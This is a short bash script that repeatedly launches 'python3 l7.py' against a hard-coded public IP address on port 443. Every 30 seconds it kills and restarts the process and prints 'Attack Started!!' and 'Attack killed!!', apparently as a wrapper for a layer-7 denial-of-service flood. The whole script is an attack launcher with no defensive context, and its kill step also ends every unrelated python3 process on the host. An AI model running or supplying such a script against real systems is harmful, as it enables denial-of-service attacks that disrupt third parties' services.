#!/bin/bash
procname="python3"
atk_cmd="python3 l7.py -i 35.221.231.4 -p 443"
while true
do
    $atk_cmd >/dev/null &
    echo Attack Started!!
    sleep 30
    echo Attack killed!!
    kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
    $atk_cmd >/dev/null &
    sleep 1
done
